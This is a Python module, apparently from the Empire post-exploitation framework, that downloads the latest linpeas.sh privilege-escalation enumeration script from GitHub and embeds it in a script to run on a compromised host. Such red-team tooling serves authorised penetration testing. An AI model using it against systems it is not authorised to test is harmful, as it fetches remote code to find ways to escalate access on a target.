import requests

from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import (
    ModuleExecutionException,
)
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize


class Module:
    @staticmethod
    def get_latest_linpeas():
        url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
        response = requests.get(url)
        if response.status_code == requests.codes.ok:
            return response.text
        raise ModuleExecutionException("Failed to download linpeas.sh")

    @staticmethod
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        linpeas_script = Module.get_latest_linpeas()
        linpeas_script = linpeas_script.replace('"""', '"')
        script = module.script % (linpeas_script)
        return script, ""
